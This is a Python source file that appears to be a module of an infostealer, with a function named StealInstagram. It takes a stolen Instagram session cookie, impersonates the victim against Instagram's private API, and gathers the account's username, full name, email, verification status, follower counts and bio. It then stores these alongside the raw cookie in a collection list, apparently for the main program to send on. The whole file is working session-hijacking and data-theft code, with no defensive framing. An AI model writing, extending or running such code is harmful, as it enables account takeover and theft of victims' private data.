import aiohttp # type: ignore
from main import ListFonction, error_handler


async def StealInstagram(self, cookie: str, browser: str) -> None:
    try:
        headers = {
            "user-agent": "Instagram 219.0.0.12.117 Android",
            "cookie": f"sessionid={cookie}"
        }

        infoURL = 'https://i.instagram.com/api/v1/accounts/current_user/?edit=true'

        async with aiohttp.ClientSession(headers=headers, connector=aiohttp.TCPConnector(ssl=True)) as session:
            async with session.get(infoURL) as response:
                data = await response.json()
            async with session.get(f"https://i.instagram.com/api/v1/users/{data['user']['pk']}/info/") as response:
                data2 = await response.json()

        username = data["user"]["username"]
        profileURL = "https://instagram.com/" + username

        bio = data["user"]["biography"] if data["user"]["biography"] else "No bio"
        bio = bio.replace("\n", ", ")

        fullname = data["user"]["full_name"] if data["user"]["full_name"] else "No nickname"
        email = data["user"].get("email", "No email")
        verify = data["user"].get("is_verified", False)
        followers = data2["user"].get("follower_count", 0)
        following = data2["user"].get("following_count", 0)

    except Exception as e:
        error_handler(f"instagram session error - {str(e)}")
    else:
        ListFonction.InstagramAccounts.append(f"Username: {username}\nFull Name: {fullname}\nEmail: {email}\nIs Verified: {'Yes' if verify else 'No'}\nFollowers: {followers}\nFollowing: {following}\nBio: {bio}\nProfile URL: {profileURL}\nBrowser: {browser}\nCookie: {cookie}")
